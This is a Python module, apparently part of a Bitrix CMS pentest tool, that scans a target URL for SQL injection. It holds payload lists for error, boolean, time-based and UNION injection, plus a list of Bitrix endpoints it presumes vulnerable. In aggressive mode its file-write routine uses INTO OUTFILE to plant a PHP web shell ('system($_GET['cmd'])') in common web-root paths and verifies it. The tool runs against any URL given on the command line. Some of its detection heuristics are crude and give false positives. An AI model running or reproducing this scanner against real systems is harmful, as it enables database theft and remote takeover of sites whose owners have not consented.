#!/usr/bin/env python3
# -*- coding: utf-8 -*-
"""
SQL Injection Scanner Module for Bitrix Pentest Tool
Tests for: Error-based, Boolean-based, Time-based, Union-based SQLi
"""

import re
import time
import random
import string
import hashlib
from urllib.parse import urljoin, quote, parse_qs, urlparse, urlencode
from typing import Dict, List, Optional, Tuple, Any, Set
from dataclasses import dataclass, field, asdict


@dataclass
class SQLiFinding:
    """SQL Injection finding"""
    severity: str  # critical, high, medium
    sqli_type: str  # error, boolean, time, union, stacked
    url: str
    parameter: str
    payload: str
    description: str
    evidence: Optional[str] = None
    dbms: Optional[str] = None  # mysql, pgsql, mssql, oracle
    exploitable: bool = False
    
    def to_dict(self) -> Dict[str, Any]:
        return asdict(self)


@dataclass
class SQLiResult:
    """Results of SQL injection scanning"""
    target: str
    findings: List[SQLiFinding] = field(default_factory=list)
    error_based: List[Dict] = field(default_factory=list)
    boolean_based: List[Dict] = field(default_factory=list)
    time_based: List[Dict] = field(default_factory=list)
    union_based: List[Dict] = field(default_factory=list)
    dbms_detected: Optional[str] = None
    
    def add_finding(self, finding: SQLiFinding):
        self.findings.append(finding)
        
        finding_dict = finding.to_dict()
        if finding.sqli_type == 'error':
            self.error_based.append(finding_dict)
        elif finding.sqli_type == 'boolean':
            self.boolean_based.append(finding_dict)
        elif finding.sqli_type == 'time':
            self.time_based.append(finding_dict)
        elif finding.sqli_type == 'union':
            self.union_based.append(finding_dict)
    
    def get_critical_count(self) -> int:
        return sum(1 for f in self.findings if f.severity == 'critical')
    
    def to_dict(self) -> Dict[str, Any]:
        return {
            'target': self.target,
            'dbms_detected': self.dbms_detected,
            'summary': {
                'total_findings': len(self.findings),
                'critical': self.get_critical_count(),
                'high': sum(1 for f in self.findings if f.severity == 'high'),
                'error_based': len(self.error_based),
                'boolean_based': len(self.boolean_based),
                'time_based': len(self.time_based),
                'union_based': len(self.union_based),
            },
            'all_findings': [f.to_dict() for f in self.findings]
        }


class BitrixSQLiScanner:
    """
    SQL Injection scanner specialized for Bitrix CMS
    """
    
    # Bitrix-specific parameters often vulnerable to SQLi
    BITRIX_PARAMS = [
        'ID', 'ELEMENT_ID', 'SECTION_ID', 'IBLOCK_ID', 'BLOCK_ID',
        'sort', 'by', 'order', 'filter', 'group',
        'PAGEN_1', 'SIZEN_1', 'SHOWALL_1',
        'set_filter', 'del_filter', 'apply_filter',
        'action', 'mode', 'type',
        'sessid', 'bxajaxid',
        'backurl', 'redirect_url',
        'PRODUCT_ID', 'CATEGORY_ID', 'USER_ID',
        'ORDER_ID', 'PAYMENT_ID', 'SHIPMENT_ID',
        'TASK_ID', 'FORUM_ID', 'TOPIC_ID',
        'FILE_ID', 'FOLDER_ID',
    ]
    
    # Common SQL error patterns
    ERROR_PATTERNS = {
        'mysql': [
            r'SQL syntax.*MySQL',
            r'Warning.*mysql_.*',
            r'valid MySQL result',
            r'MySqlClient\.',
            r'com\.mysql\.jdbc',
            r'MySQLSyntaxErrorException',
            r'You have an error in your SQL syntax',
            r'Unknown column',
            r'Incorrect syntax',
        ],
        'pgsql': [
            r'PostgreSQL.*ERROR',
            r'Warning.*\Wpg_.*',
            r'valid PostgreSQL result',
            r'Npgsql\.',
            r'PG::SyntaxError:',
            r'org\.postgresql\.util\.PSQLException',
        ],
        'mssql': [
            r'Driver.* SQL[\-\_ ]*Server',
            r'OLE DB.* SQL Server',
            r'(\W|\A)SQL.*Server.*Driver',
            r'Warning.*mssql_.*',
            r'(\W|\A)SQL.*Server.*[0-9a-fA-F]{8}',
            r'Exception.*\WSystem\.Data\.SqlClient\.',
            r'Exception.*\WRoadhouse\.Cms\.',
        ],
        'oracle': [
            r'\bORA-[0-9][0-9][0-9][0-9]',
            r'Oracle error',
            r'Oracle.*Driver',
            r'Warning.*\Woci_.*',
            r'Warning.*\Wora_.*',
        ],
        'sqlite': [
            r'SQLite/JDBCDriver',
            r'SQLite\.Exception',
            r'System\.Data\.SQLite\.SQLiteException',
            r'Warning.*sqlite_.*',
            r'Warning.*SQLite3::',
        ],
    }
    
    # SQLi payloads
    PAYLOADS = {
        'error': [
            "'",
            "''",
            "'\"",
            "';",
            "'--",
            "\"'",
            "\";--",
            "1'",
            "1\"",
            "1')",
            "1\")",
            "' OR '1'='1",
            "' OR 1=1--",
            "' OR 1=1#",
            "' OR 1=1/*",
            "') OR 1=1--",
            "') OR 1=1#",
            "') OR ('1'='1",
            "' AND 1=1",
            "' AND 1=2",
            "' AND 1=1--",
            "' AND 1=2--",
            "1 AND 1=1",
            "1 AND 1=2",
            "1' AND 1=1--",
            "1' AND 1=2--",
            "1' AND SLEEP(0)--",
            "1' AND SLEEP(5)--",
            "1' AND (SELECT * FROM (SELECT(SLEEP(5)))a)--",
            "1' UNION SELECT NULL--",
            "1' UNION SELECT NULL,NULL--",
            "1' UNION SELECT NULL,NULL,NULL--",
            "'; WAITFOR DELAY '0:0:5'--",
            "'; SELECT pg_sleep(5)--",
            "' AND 1=CONVERT(int, (SELECT @@version))--",
            "' AND 1=CAST((SELECT @@version) AS int)--",
        ],
        'boolean': [
            "' AND 1=1--",
            "' AND 1=2--",
            "' OR 1=1--",
            "' OR 1=2--",
            "1 AND 1=1",
            "1 AND 1=2",
            "1' AND '1'='1",
            "1' AND '1'='2",
            "1' AND LENGTH(@@version)>0--",
            "1' AND LENGTH(@@version)>100--",
        ],
        'time': [
            "' AND SLEEP(5)--",
            "' AND SLEEP(10)--",
            "'; WAITFOR DELAY '0:0:5'--",
            "'; SELECT pg_sleep(5)--",
            "' AND (SELECT * FROM (SELECT(SLEEP(5)))a)--",
            "' AND 1=(SELECT 1 FROM (SELECT SLEEP(5))a)--",
            "'; BEGIN DBMS_LOCK.SLEEP(5); END;--",
        ],
        'union': [
            "' UNION SELECT NULL--",
            "' UNION SELECT NULL,NULL--",
            "' UNION SELECT NULL,NULL,NULL--",
            "' UNION SELECT NULL,NULL,NULL,NULL--",
            "' UNION SELECT 1,2,3--",
            "' UNION SELECT 1,'2','3'--",
            "' UNION SELECT @@version,NULL,NULL--",
            "' UNION SELECT version(),NULL,NULL--",
            "' UNION SELECT table_name,NULL FROM information_schema.tables--",
        ],
    }
    
    def __init__(self, requester, logger, parser):
        self.requester = requester
        self.logger = logger
        self.parser = parser
        self.target_params: Set[str] = set()
        self.dbms: Optional[str] = None
        
    def scan(self, target_url: str, aggressive: bool = False) -> SQLiResult:
        """
        Main SQL injection scanning method
        
        Args:
            target_url: Target base URL
            aggressive: Enable time-based tests and deep scanning
        
        Returns:
            SQLiResult with all findings
        """
        self.logger.info(f"Starting SQL Injection scan for {target_url}")
        result = SQLiResult(target=target_url)
        
        base_url = self._normalize_url(target_url)
        
        # 1. Discover injection points
        self.logger.info("Discovering injection points...")
        endpoints = self._discover_endpoints(base_url)
        
        # 2. Test for error-based SQLi
        self.logger.info("Testing error-based SQL injection...")
        self._test_error_based(base_url, endpoints, result)
        
        # 3. Test for boolean-based blind SQLi
        self.logger.info("Testing boolean-based blind SQL injection...")
        self._test_boolean_based(base_url, endpoints, result)
        
        # 4. Test for time-based blind SQLi (if aggressive)
        if aggressive:
            self.logger.info("Testing time-based blind SQL injection...")
            self._test_time_based(base_url, endpoints, result)
        
        # 5. Test for UNION-based SQLi
        self.logger.info("Testing UNION-based SQL injection...")
        self._test_union_based(base_url, endpoints, result)
        
        # 6. Test Bitrix-specific endpoints
        self.logger.info("Testing Bitrix-specific endpoints...")
        self._test_bitrix_endpoints(base_url, result)
        
        # 7. Try to exploit for file write (if critical found)
        if result.get_critical_count() > 0 and aggressive:
            self.logger.info("Attempting file write via SQLi...")
            self._attempt_file_write(base_url, result)
        
        # Summary
        total = len(result.findings)
        critical = result.get_critical_count()
        self.logger.info(f"SQLi scan complete: {total} findings ({critical} critical)")
        
        if self.dbms:
            result.dbms_detected = self.dbms
        
        return result
    
    def _normalize_url(self, url: str) -> str:
        """Normalize URL"""
        if not url.startswith(('http://', 'https://')):
            url = 'https://' + url
        return url.rstrip('/')
    
    def _discover_endpoints(self, base_url: str) -> List[Tuple[str, str, Dict[str, str]]]:
        """
        Discover endpoints with parameters
        
        Returns:
            List of (url, method, params) tuples
        """
        endpoints = []
        
        # Common Bitrix endpoints with parameters
        test_urls = [
            f"{base_url}/",
            f"{base_url}/catalog/",
            f"{base_url}/news/",
            f"{base_url}/search/",
            f"{base_url}/bitrix/components/bitrix/catalog.section/",
            f"{base_url}/bitrix/tools/public_session.php",
        ]
        
        for url in test_urls:
            try:
                resp = self.requester.get(url)
                if not resp:
                    continue
                
                # Extract forms
                forms = self.parser.parse_html_forms(resp.text)
                for form in forms:
                    form_url = urljoin(url, form.get('action', ''))
                    method = form.get('method', 'GET').upper()
                    params = {inp['name']: '1' for inp in form.get('inputs', []) if inp.get('name')}
                    
                    if params:
                        endpoints.append((form_url, method, params))
                
                # Extract URL parameters
                parsed = urlparse(url)
                if parsed.query:
                    params = {k: '1' for k in parse_qs(parsed.query).keys()}
                    endpoints.append((url, 'GET', params))
                    
            except Exception as e:
                self.logger.debug(f"Error discovering {url}: {e}")
        
        # Add known vulnerable Bitrix endpoints
        for param in self.BITRIX_PARAMS:
            endpoints.append((f"{base_url}/", 'GET', {param: '1'}))
        
        # Remove duplicates by converting to string representation
        seen = set()
        unique_endpoints = []
        for endpoint in endpoints:
            # Create hashable key: (url, method, tuple(sorted(params.items())))
            key = (endpoint[0], endpoint[1], tuple(sorted(endpoint[2].items())))
            if key not in seen:
                seen.add(key)
                unique_endpoints.append(endpoint)
        
        return unique_endpoints
    
    def _test_error_based(self, base_url: str, endpoints: List, result: SQLiResult):
        """Test for error-based SQL injection"""
        for url, method, params in endpoints:
            for param_name in list(params.keys()):
                for payload in self.PAYLOADS['error']:
                    test_params = params.copy()
                    test_params[param_name] = payload
                    
                    try:
                        if method == 'GET':
                            test_url = f"{url}?{urlencode(test_params)}"
                            resp = self.requester.get(test_url)
                        else:
                            resp = self.requester.post(url, data=test_params)
                        
                        if not resp:
                            continue
                        
                        # Check for SQL errors
                        dbms, error_msg = self._detect_sql_error(resp.text)
                        
                        if dbms:
                            self.dbms = dbms
                            finding = SQLiFinding(
                                severity='critical',
                                sqli_type='error',
                                url=url,
                                parameter=param_name,
                                payload=payload,
                                description=f"Error-based SQLi in {param_name}",
                                evidence=error_msg[:200],
                                dbms=dbms,
                                exploitable=True
                            )
                            result.add_finding(finding)
                            self.logger.critical(f"!!! SQLi ERROR: {url} | {param_name} | {dbms}")
                            return  # Stop on first finding for this endpoint
                            
                    except Exception as e:
                        self.logger.debug(f"Error testing {url}: {e}")
    
    def _detect_sql_error(self, content: str) -> Tuple[Optional[str], Optional[str]]:
        """Detect SQL error and DBMS type"""
        content_lower = content.lower()
        
        for dbms, patterns in self.ERROR_PATTERNS.items():
            for pattern in patterns:
                match = re.search(pattern, content_lower, re.IGNORECASE)
                if match:
                    return dbms, match.group(0)
        
        return None, None
    
    def _test_boolean_based(self, base_url: str, endpoints: List, result: SQLiResult):
        """Test for boolean-based blind SQL injection"""
        for url, method, params in endpoints:
            for param_name in list(params.keys()):
                # Test TRUE and FALSE conditions
                true_payloads = ["1' AND 1=1--", "1' AND '1'='1", "1 AND 1=1"]
                false_payloads = ["1' AND 1=2--", "1' AND '1'='2", "1 AND 1=2"]
                
                for true_p, false_p in zip(true_payloads, false_payloads):
                    try:
                        # TRUE condition
                        true_params = params.copy()
                        true_params[param_name] = true_p
                        
                        if method == 'GET':
                            true_url = f"{url}?{urlencode(true_params)}"
                            true_resp = self.requester.get(true_url)
                        else:
                            true_resp = self.requester.post(url, data=true_params)
                        
                        # FALSE condition
                        false_params = params.copy()
                        false_params[param_name] = false_p
                        
                        if method == 'GET':
                            false_url = f"{url}?{urlencode(false_params)}"
                            false_resp = self.requester.get(false_url)
                        else:
                            false_resp = self.requester.post(url, data=false_params)
                        
                        if not true_resp or not false_resp:
                            continue
                        
                        # Compare responses
                        true_len = len(true_resp.text)
                        false_len = len(false_resp.text)
                        
                        # Significant difference indicates boolean-based SQLi
                        if abs(true_len - false_len) > 100:
                            finding = SQLiFinding(
                                severity='high',
                                sqli_type='boolean',
                                url=url,
                                parameter=param_name,
                                payload=f"{true_p} / {false_p}",
                                description=f"Boolean-based blind SQLi in {param_name}",
                                evidence=f"Length diff: {true_len} vs {false_len}",
                                exploitable=True
                            )
                            result.add_finding(finding)
                            self.logger.warning(f"Boolean SQLi: {url} | {param_name}")
                            break
                            
                    except Exception as e:
                        self.logger.debug(f"Error in boolean test: {e}")
    
    def _test_time_based(self, base_url: str, endpoints: List, result: SQLiResult):
        """Test for time-based blind SQL injection"""
        import requests
        
        for url, method, params in endpoints:
            for param_name in list(params.keys()):
                for payload in self.PAYLOADS['time']:
                    test_params = params.copy()
                    test_params[param_name] = payload
                    
                    try:
                        start_time = time.time()
                        
                        if method == 'GET':
                            test_url = f"{url}?{urlencode(test_params)}"
                            resp = self.requester.get(test_url, timeout=15)
                        else:
                            resp = self.requester.post(url, data=test_params, timeout=15)
                        
                        elapsed = time.time() - start_time
                        
                        # If delay is significant (payload has SLEEP(5))
                        if elapsed > 4:
                            finding = SQLiFinding(
                                severity='critical',
                                sqli_type='time',
                                url=url,
                                parameter=param_name,
                                payload=payload,
                                description=f"Time-based blind SQLi in {param_name}",
                                evidence=f"Response time: {elapsed:.2f}s",
                                exploitable=True
                            )
                            result.add_finding(finding)
                            self.logger.critical(f"!!! TIME-BASED SQLi: {url} | {param_name} | {elapsed:.2f}s")
                            return
                            
                    except requests.exceptions.Timeout:
                        # Timeout might indicate successful SLEEP
                        finding = SQLiFinding(
                            severity='critical',
                            sqli_type='time',
                            url=url,
                            parameter=param_name,
                            payload=payload,
                            description=f"Time-based blind SQLi (timeout)",
                            evidence="Request timeout",
                            exploitable=True
                        )
                        result.add_finding(finding)
                        self.logger.critical(f"!!! TIME-BASED SQLi (timeout): {url} | {param_name}")
                        return
                    except Exception as e:
                        self.logger.debug(f"Error in time test: {e}")
    
    def _test_union_based(self, base_url: str, endpoints: List, result: SQLiResult):
        """Test for UNION-based SQL injection"""
        for url, method, params in endpoints:
            for param_name in list(params.keys()):
                # First find number of columns
                for payload in self.PAYLOADS['union']:
                    test_params = params.copy()
                    test_params[param_name] = payload
                    
                    try:
                        if method == 'GET':
                            test_url = f"{url}?{urlencode(test_params)}"
                            resp = self.requester.get(test_url)
                        else:
                            resp = self.requester.post(url, data=test_params)
                        
                        if not resp:
                            continue
                        
                        # Check for UNION success indicators
                        union_indicators = [
                            r'NULL',
                            r'@@version',
                            r'version\(\)',
                            r'database\(\)',
                            r'user\(\)',
                        ]
                        
                        for indicator in union_indicators:
                            if re.search(indicator, resp.text, re.IGNORECASE):
                                finding = SQLiFinding(
                                    severity='critical',
                                    sqli_type='union',
                                    url=url,
                                    parameter=param_name,
                                    payload=payload,
                                    description=f"UNION-based SQLi in {param_name}",
                                    evidence=f"Indicator: {indicator}",
                                    exploitable=True
                                )
                                result.add_finding(finding)
                                self.logger.critical(f"!!! UNION SQLi: {url} | {param_name}")
                                return
                                
                    except Exception as e:
                        self.logger.debug(f"Error in union test: {e}")
    
    def _test_bitrix_endpoints(self, base_url: str, result: SQLiResult):
        """Test Bitrix-specific endpoints known for SQLi"""
        
        # Known vulnerable endpoints
        bitrix_tests = [
            # Session endpoint
            {
                'url': f"{base_url}/bitrix/tools/public_session.php",
                'method': 'GET',
                'params': {'sessid': "'"},
            },
            # Catalog filter
            {
                'url': f"{base_url}/bitrix/components/bitrix/catalog.section/ajax.php",
                'method': 'POST',
                'params': {'IBLOCK_ID': "1'", 'ELEMENT_SORT_FIELD': 'shows'},
            },
            # News list
            {
                'url': f"{base_url}/bitrix/components/bitrix/news.list/ajax.php",
                'method': 'GET',
                'params': {'SECTION_ID': "1'", 'IBLOCK_ID': '1'},
            },
            # Sale order
            {
                'url': f"{base_url}/bitrix/components/bitrix/sale.order.ajax/ajax.php",
                'method': 'POST',
                'params': {'id': "1'", 'action': 'getOrder'},
            },
        ]
        
        for test in bitrix_tests:
            try:
                if test['method'] == 'GET':
                    test_url = f"{test['url']}?{urlencode(test['params'])}"
                    resp = self.requester.get(test_url)
                else:
                    resp = self.requester.post(test['url'], data=test['params'])
                
                if not resp:
                    continue
                
                dbms, error_msg = self._detect_sql_error(resp.text)
                
                if dbms:
                    finding = SQLiFinding(
                        severity='critical',
                        sqli_type='error',
                        url=test['url'],
                        parameter=list(test['params'].keys())[0],
                        payload=list(test['params'].values())[0],
                        description=f"Bitrix-specific SQLi",
                        evidence=error_msg[:200],
                        dbms=dbms,
                        exploitable=True
                    )
                    result.add_finding(finding)
                    self.logger.critical(f"!!! BITRIX SQLi: {test['url']}")
                    
            except Exception as e:
                self.logger.debug(f"Error testing Bitrix endpoint: {e}")
    
    def _attempt_file_write(self, base_url: str, result: SQLiResult):
        """Attempt to write file via SQLi (MySQL only)"""
        if not self.dbms or self.dbms != 'mysql':
            return
        
        # Try to find a UNION-based injection to use
        union_findings = [f for f in result.findings if f.sqli_type == 'union']
        
        if not union_findings:
            return
        
        finding = union_findings[0]
        
        # Payload for file write
        web_root_paths = [
            '/var/www/html/',
            '/var/www/',
            '/usr/share/nginx/html/',
            '/opt/bitrix/www/',
            '/home/bitrix/www/',
            '/srv/www/',
        ]
        
        shell_content = "<?php system($_GET['cmd']); ?>"
        
        for path in web_root_paths:
            outfile_payload = f"{finding.payload[:-2]} INTO OUTFILE '{path}shell.php'--"
            
            try:
                test_params = {finding.parameter: outfile_payload}
                test_url = f"{finding.url}?{urlencode(test_params)}"
                
                resp = self.requester.get(test_url)
                
                # Check if file was created
                shell_url = urljoin(base_url, '/shell.php')
                check_resp = self.requester.get(shell_url)
                
                if check_resp and check_resp.status_code == 200:
                    self.logger.critical(f"!!! SHELL WRITTEN: {shell_url}?cmd=whoami")
                    
                    # Add finding
                    file_finding = SQLiFinding(
                        severity='critical',
                        sqli_type='union',
                        url=finding.url,
                        parameter=finding.parameter,
                        payload=outfile_payload,
                        description=f"File write via SQLi: {path}shell.php",
                        evidence=f"Shell at: {shell_url}",
                        dbms='mysql',
                        exploitable=True
                    )
                    result.add_finding(file_finding)
                    return
                    
            except Exception as e:
                self.logger.debug(f"File write attempt failed: {e}")


# Testing
if __name__ == "__main__":
    import sys
    import logging
    sys.path.append('..')
    
    from utils.requester import Requester
    from utils.logger import ColoredLogger
    from utils.parser import BitrixParser
    
    logger = ColoredLogger(level=logging.DEBUG)
    requester = Requester()
    parser = BitrixParser()
    
    scanner = BitrixSQLiScanner(requester, logger, parser)
    
    if len(sys.argv) > 1:
        result = scanner.scan(sys.argv[1], aggressive=True)
        print(f"\n{'='*60}")
        print(f"CRITICAL: {result.get_critical_count()}")
        print(f"DBMS: {result.dbms_detected}")
        print(f"Findings: {len(result.findings)}")